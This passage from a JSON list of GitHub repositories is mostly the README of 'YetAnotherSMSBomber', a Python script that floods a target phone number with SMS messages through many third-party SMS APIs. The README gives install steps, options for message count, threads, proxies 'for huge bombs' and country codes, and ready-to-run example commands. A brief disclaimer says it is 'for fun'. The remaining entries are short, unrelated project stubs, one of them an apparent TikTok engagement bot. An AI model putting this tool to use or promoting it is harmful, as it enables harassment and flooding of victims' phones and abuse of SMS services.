    "readme": "![Explosion!!](https://imgur.com/download/FPZPLK9)\n\n## Features\n- Lots of integrated SMS APIs, and support for custom API configuration!\n- Unlimited number of SMSs (with proxy support for huge bombs!).\n- Faster and lighter than most SMS Bomber apps/scripts.\n- International bombing available.\n\n## Requirements\n- Python 3.6+ on MacOS, Android ([Termux](https://termux.com)), Linux, or iOS ([iSH](https://apps.apple.com/us/app/ish-shell/id1436902243))\n\nNOTE: Windows not supported as some of `httpx`'s `http2` libraries can't be installed on it.\n\n## Instructions for MacOS\n```bash\n# Install brew\n/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n\n# Install Dependencies\nbrew install git\nbrew install python3\nsudo easy_install pip\nsudo pip install --upgrade pip\n\n# Clone this repo\ngit clone https://github.com/AvinashReddy3108/YetAnotherSMSBomber.git\n\n# Move into working directory.\ncd YetAnotherSMSBomber\n\n# Install the requirements.\npip3 install -r requirements.txt\n```\n\n## Instructions for Android\n\nDownload Termux from the [Play Store](https://play.google.com/store/apps/details?id=com.termux)\n\nOpen Termux and enter the following commands:\n\n```bash\n# Install Dependencies:\npkg install git python -y\n\n# Clone this repo\ngit clone https://github.com/AvinashReddy3108/YetAnotherSMSBomber.git\n\n# Move into working directory.\ncd YetAnotherSMSBomber\n\n# Install the requirements.\npip3 install -r requirements.txt\n```\n\n## Instructions for iOS/iPadOS(due to the way Apple devices handle ram usage it's gonna be slow but it works :P)\n\nDownload iSH from [here](https://apps.apple.com/us/app/ish-shell/id1436902243)\n\nOpen iSH and enter the following commands:\n\n```bash\n# Install Dependencies:\napk add git\napk add python3\napk add py3-pip\n\n# Clone this repo\ngit clone https://github.com/AvinashReddy3108/YetAnotherSMSBomber.git\n\n# Move into working directory.\ncd YetAnotherSMSBomber\n\n# Install the requirements.\npip3 install -r requirements.txt\n```\n\n## Instructions for Debian-based GNU/Linux distributions:\n\n```bash\n# Install Dependencies:\nsudo apt install git python3 python3-pip\n\n# Clone this repo\ngit clone https://github.com/AvinashReddy3108/YetAnotherSMSBomber.git\n\n# Move into working directory.\ncd YetAnotherSMSBomber\n\n# Install the requirements.\npip3 install -r requirements.txt\n```\n\n## Options\nYou can also read this via `python3 bomber.py -h` or `python3 bomber.py --help`\n\n```\nYetAnotherSMSBomber - A clean, small and powerful SMS bomber script.\n\nUsage: bomber.py [--config-path/-c] [--num/-N] [--country/-C] [--threads/-T]\n                 [--timeout/-t] [--proxy/-P] [--verbose/-v] [--verify/-V]\n                 [-h/--help] TARGET\n\nPositional arguments:\n  TARGET             Target mobile number without country code.\n\nOptional arguments:\n  --config-path, -c  Path to API config file. (NOTE: the file must be in JSON format!) (default: 'api_config.json')\n  --num, -N          Number of SMSs to send to TARGET. (default: 30)\n  --country, -C      Country code without (+) sign. (default: 91)\n  --threads, -T      Max number of concurrent HTTP(s) requests. (default: 15)\n  --timeout, -t      Time (in seconds) to wait for an API request to complete. (default: 10)\n  --proxy, -P        Use proxy for bombing. (Recommended for large number of SMSs)\n  --verbose, -v      Enables verbose output, for debugging.\n  --verify, -V       To verify all providers are working or not.\n  -h, --help         Display this message.\n\nUse this for fun, not for revenge or bullying!\n```\n\n## Examples\n```bash\n# The default - 25 threads, 50 SMSs, Country Code: +91\npython3 bomber.py <TARGET>\n\n# Custom SMS count and proxy.\npython3 bomber.py --num 1000 --proxy <TARGET>\npython3 bomber.py -N 1000 -P <TARGET>\n\n# Custom API config file and proxy.\npython3 bomber.py --config-path \"./config.json\" --proxy <TARGET>\npython3 bomber.py -c \"./config.json\" -P <TARGET>\n\n# Here's how you use all possible parameters to your taste.\npython3 bomber.py --proxy --num 500 --country 91 --timeout 20 <TARGET>\npython3 bomber.py -p -N 500 -c 91 -T 30 -t 20 <TARGET>\n```\n\n## Credits and Thanks\n- Huge kudos to [iMro0t](https://github.com/iMro0t) for the original source code. Find it [here](https://github.com/iMro0t/bomb3r/).\n- Thanks [botallen](https://github.com/botallen) for the recent fixes which have been merged from the original repo.\n- [SpeedX](https://github.com/TheSpeedX)'s [TBomb](https://github.com/TheSpeedX/TBomb) for some API's used here.\n- [fonic](https://github.com/fonic) for his awesome formatter for `argparse`. Check it out in this [gist](https://gist.github.com/fonic/fe6cade2e1b9eaf3401cc732f48aeebd)!\n\n## License\nThis project is licensed under the [GNU General Public License v3.0](https://github.com/AvinashReddy3108/YetAnotherSMSBomber/blob/master/LICENSE)\n"
  },
  {
    "name": "StudentsTranscript",
    "description": null,
    "url": "https://github.com/edonberishaa/StudentsTranscript",
    "readme": "Students transcript API using ASP.NET core Web API\n"
  },
  {
    "name": "ToDo-Web-Application",
    "description": null,
    "url": "https://github.com/edonberishaa/ToDo-Web-Application",
    "readme": "To-Do Tasks | Web Application in progress| Developing with ASP.NET Core MVC & SQL Server & EntityFrameworkCore & ASP.NET Identity\n"
  },
  {
    "name": "webperftours",
    "description": "A website to demonstrate common website performance issues",
    "url": "https://github.com/edonberishaa/webperftours",
    "readme": "No README found."
  },
  {
    "name": "Zefoy-TikTok-Automator",
    "description": "Tt Bot",
    "url": "https://github.com/edonberishaa/Zefoy-TikTok-Automator",
    "readme": "No README found."
  }
]